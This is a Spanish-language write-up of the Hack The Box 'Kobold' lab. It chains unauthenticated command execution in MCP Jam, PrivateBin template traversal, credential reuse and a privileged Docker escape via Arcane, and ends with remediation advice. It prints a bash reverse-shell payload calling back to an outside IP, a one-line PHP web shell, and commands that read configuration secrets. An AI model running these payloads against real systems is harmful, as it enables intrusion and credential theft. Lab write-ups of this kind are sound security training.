---
layout: single
title: "HTB Kobold - Writeup"
date: 2026-04-10
difficulty: Fácil
operating_system: Linux
service_hint: MCP Jam API + PrivateBin + Arcane
summary: "Cadena de explotación: RCE sin autenticación en MCP Jam, abuso de PrivateBin para ejecutar PHP, extracción de credenciales redactadas y escape al host a través de Arcane/Docker."
---

## Información general

| Campo | Valor |
|-------|-------|
| IP | `10.129.31.14` |
| Sistema operativo | Linux |
| Dificultad | Fácil |
| Tags | `RCE`, `LFI`, `Path Traversal`, `Reutilización de credenciales`, `Escalada de privilegios con Docker` |

## Reconocimiento

Como en cualquier ejercicio de pentest o HTB, el objetivo inicial no es "tirar exploits", sino construir contexto tecnico suficiente para priorizar superficies de ataque. Para eso se combinaron `nmap` y `wfuzz`.

Este primer escaneo con `nmap` sirve para detectar puertos abiertos rapidamente y reducir la superficie a analizar.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.31.14
```

Una vez identificados los puertos expuestos, este segundo escaneo profundiza en versiones, banners, titulos HTTP y fingerprints de servicio.

```bash
nmap -p22,80,443,3552 -sCV 10.129.31.14
```

Los indicadores mas utiles de esta fase fueron:

- `80/tcp` y `443/tcp` redirigen a `kobold.htb`, lo que obliga a trabajar con nombre virtual y no solo con IP.
- El certificado TLS expone `kobold.htb` y `*.kobold.htb`, una pista clara de que puede haber subdominios adicionales.
- `3552/tcp` devuelve una aplicacion HTTP basada en Go, con una respuesta tipo SPA y rutas como `/api/app-images/favicon`, lo que sugiere una consola web moderna o panel administrativo.

Con ese contexto, el siguiente paso logico es fuzzear virtual hosts. `wfuzz` se usa aqui no como fuerza bruta ciega, sino como tecnica de expansion de superficie aprovechando el wildcard del certificado.

```bash
wfuzz -H "Host: FUZZ.kobold.htb" --hc 404,403 --hh=154 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  https://kobold.htb
```

Subdominios relevantes:

- `mcp.kobold.htb` -> MCP Jam
- `bin.kobold.htb` -> PrivateBin

Ese resultado ya ordena la investigacion: `bin` apunta a un producto conocido y `mcp` sugiere una aplicacion mas especializada, probablemente con endpoints API propios.

## Metodología de análisis del vector inicial

El punto de entrada se priorizo en `mcp.kobold.htb` porque el nombre del subdominio y la respuesta del servicio en `3552/tcp` sugerian una aplicacion orientada a integracion, con backend JSON y endpoints operativos. En este tipo de superficies, cualquier accion tipo "connect" o "run" merece atencion temprana porque a menudo termina exponiendo ejecucion de procesos en el host.

Las notas no conservan el discovery exacto del endpoint, asi que no afirmo si `/api/mcp/connect` se obtuvo desde DevTools, desde el JavaScript cliente o desde documentacion expuesta. Metodologicamente, el flujo razonable era inspeccionar trafico en **DevTools / Network tab**, revisar rutas `/api/...` en el frontend, reproducir peticiones con `curl` y contrastar el producto en **Google**, **GitHub**, **searchsploit**, **NVD** y buscadores de **CVE**.

## Investigación de vulnerabilidades y señales de riesgo

Como referencia para quien quiera investigar mas a fondo el vector de MCP Jam, puede revisarse `CVE-2026-23744`. En cualquier caso, la explotacion no depende de esa referencia externa, sino de lo observado directamente en la aplicacion.

Lo que vuelve especialmente sospechoso a `/api/mcp/connect` es que el payload acepta `serverConfig`, `command`, `args` y `env`, es decir, parametros semanticamente equivalentes a lanzar un proceso arbitrario desde el backend. Cuando una API permite definir binario y argumentos desde el cliente, el salto de funcionalidad insegura a RCE es minimo y justifica validacion inmediata.

## Acceso inicial con MCP Jam

Antes de probar una posible ejecucion remota, se prepara un listener con `nc` para recibir una reverse shell y evitar perder tiempo una vez confirmada la explotacion.

```bash
nc -nlvp 4444
```

Una vez identificado el endpoint sospechoso, `curl` permite reproducir la peticion manualmente y comprobar si el servidor ejecuta el comando especificado en el JSON. Se utiliza `curl` porque elimina cualquier dependencia del cliente web y deja claro que la logica vulnerable esta en el backend.

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.191/4444 0>&1"],
      "env": {}
    },
    "serverId": "mytest"
  }'
```

La ejecucion de esta peticion devuelve una shell como `ben`, lo que valida la hipotesis de RCE sin necesidad de apoyarse en un exploit publico ni en una CVE confirmada.

Este comando contextualiza la shell obtenida y revela un dato clave para la siguiente fase: `ben` pertenece al grupo `operator`.

```bash
id
```

Salida relevante:

```text
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

La flag de usuario existe en `/home/ben/user.txt`, pero su valor se omite deliberadamente.

## Enumeración local

Este comando lista usuarios interactivos y ayuda a identificar otras cuentas potencialmente reutilizadas en servicios internos.

```bash
cat /etc/passwd | grep bash
```

Este comando enumera puertos en escucha para localizar servicios internos o paneles de administracion no evidentes desde fuera.

```bash
ss -tulnp
```

Este hallazgo muestra que el puerto `3552` sigue siendo importante y que existen servicios locales relacionados con la aplicacion.

Este comando busca archivos y directorios accesibles por el grupo `operator`, que es justo el grupo del usuario comprometido.

```bash
find / -group operator 2>/dev/null
```

El resultado interesante es `/privatebin-data`, incluyendo el directorio `data/`, donde se pueden crear ficheros consumidos por PrivateBin.

## Abuso de PrivateBin

Este bloque crea un archivo PHP simple dentro del almacenamiento de PrivateBin para comprobar si luego puede ser interpretado desde la aplicacion web.

```bash
cat > /privatebin-data/data/pwn.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Este `curl` abusa de la cookie `template` para forzar a PrivateBin a cargar el archivo anterior y ejecutar un comando de prueba.

```bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=id"
```

Salida relevante:

```text
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

Con la ejecucion confirmada, este comando intenta leer el fichero de configuracion para extraer secretos operativos de la aplicacion.

```bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
```

En la respuesta aparece configuracion sensible. Los valores se muestran redactados:

```ini
usr = "[REDACTED]"
pwd = "[REDACTED]"
```

Lo importante no es el secreto en si, sino el impacto: la misma clave estaba reutilizada para el acceso al panel Arcane con una cuenta administrativa interna.

## Acceso a Arcane y escape al host

Las capturas del material original muestran el flujo seguido dentro de Arcane despues de reutilizar la credencial obtenida en PrivateBin.

La primera captura corresponde al portal de login de Arcane expuesto en `http://kobold.htb:3552/login`.

![Pantalla de acceso a Arcane](/images/writeups/kobold/arcane-login.png)

Una vez autenticado, Arcane administra el socket Docker local `unix:///var/run/docker.sock`, por lo que desde su panel se pueden crear contenedores en el host.

![Panel de contenedores de Arcane](/images/writeups/kobold/arcane-containers.png)

La idea es crear un contenedor nuevo usando una imagen ya disponible, ejecutar una shell, hacerlo correr como `root` y aprovechar montajes del host.

![Configuracion basica del contenedor](/images/writeups/kobold/container-basic-config.png)

Este paso monta la raiz `/` del host dentro del contenedor en `/hostfs`, lo que abre acceso directo al filesystem real del sistema comprometido.

![Montaje del filesystem del host](/images/writeups/kobold/container-volume-mount.png)

Ademas, se habilita `Privileged mode`, lo que elimina gran parte del aislamiento y hace trivial el acceso total al host montado.

![Modo privilegiado activado](/images/writeups/kobold/container-privileged-mode.png)

Una vez lanzado el contenedor, Arcane ofrece una shell interactiva dentro de el.

![Shell interactiva dentro del contenedor](/images/writeups/kobold/container-shell.png)

Ya dentro del contenedor, estos comandos validan que se corre como `root` y permiten leer la flag del host a traves del montaje `/hostfs`.

```bash
whoami
cat /hostfs/root/root.txt
```

El valor de la flag de `root` se omite deliberadamente.

## Cadena de explotación

```text
MCP Jam /api/mcp/connect sin auth
-> RCE como ben
-> pertenencia al grupo operator
-> escritura en /privatebin-data
-> template traversal / inclusion en PrivateBin
-> lectura de configuracion sensible
-> reutilizacion de credenciales en Arcane
-> creacion de contenedor privilegiado con / montado
-> acceso a /hostfs/root/root.txt
```

## Lecciones técnicas

- Una API que acepta comandos arbitrarios desde el cliente equivale a RCE si no existe autenticacion fuerte y validacion estricta.
- Los permisos de grupo aparentemente inocentes pueden convertirse en ejecucion de codigo al combinarse con otra aplicacion mal diseñada.
- PrivateBin no solo filtraba informacion: permitia convertir escritura en disco mas traversal de plantillas en ejecucion de comandos.
- Cualquier panel con acceso al socket Docker debe tratarse como acceso equivalente a `root` en el host.

## Remediación

1. Proteger `/api/mcp/connect` con autenticacion y una allowlist estricta de procesos autorizados.
2. Impedir que PrivateBin cargue templates o recursos desde rutas controlables por el usuario.
3. Rotar y segregar credenciales entre servicios; una clave interna no debe reutilizarse en varios componentes.
4. Restringir el acceso a Docker y bloquear la creacion de contenedores privilegiados con montajes del host.
